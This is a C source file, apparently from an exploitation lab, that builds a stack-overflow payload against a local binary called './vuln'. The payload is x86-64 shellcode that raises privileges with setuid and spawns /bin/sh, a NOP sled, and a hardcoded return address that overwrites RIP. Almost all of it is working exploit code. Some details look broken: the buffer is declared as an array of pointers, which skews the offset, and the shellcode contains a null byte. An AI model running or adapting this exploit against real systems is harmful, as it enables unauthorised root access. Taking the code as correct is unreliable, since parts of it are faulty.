#include <stdio.h>
#include <string.h>
#include <stdlib.h>
#include <unistd.h>

unsigned char shellcode[] =
  "\x6a\x6b"              // push 0x6b (geteuid)
  "\x58"                  // pop rax
  "\x0f\x05"              // syscall
  "\x48\x89\xc7"          // mov rdi, rax
  "\x6a\x69"              // push 0x69 (setuid)
  "\x58"                  // pop rax
  "\x0f\x05"              // syscall
  "\x6a\x3b"              // push 0x3b
  "\x58"                  // pop rax
  "\x99"                  // cdq
  "\x48\xbb\x2f\x62\x69\x6e\x2f\x73\x68\x00"  // mov rbx, "/bin/sh"
  "\x53"                  // push rbx
  "\x48\x89\xe7"          // mov rdi, rsp
  "\x52"                  // push rdx
  "\x57"                  // push rdi
  "\x48\x89\xe6"          // mov rsi, rsp
  "\x0f\x05";             // syscall

unsigned char* payload[80];

int main() {
    printf("Indirizzo di payload: %p\n", payload);
    memset(payload, 0x90, sizeof(payload)); // NOP sled

    memcpy(payload, shellcode, sizeof(shellcode)); // inserisce shellcode

    void *ret_addr = (void*)(0x7fffffffecc0 + 2); // aggiornare se necessario
    memcpy(payload + 72, &ret_addr, 8); // overwrite RIP

    char *args[] = {"./vuln", (char*)payload, NULL};
    execve("./vuln", args, NULL);
    perror("execve");
    getchar();
    return 1;
}

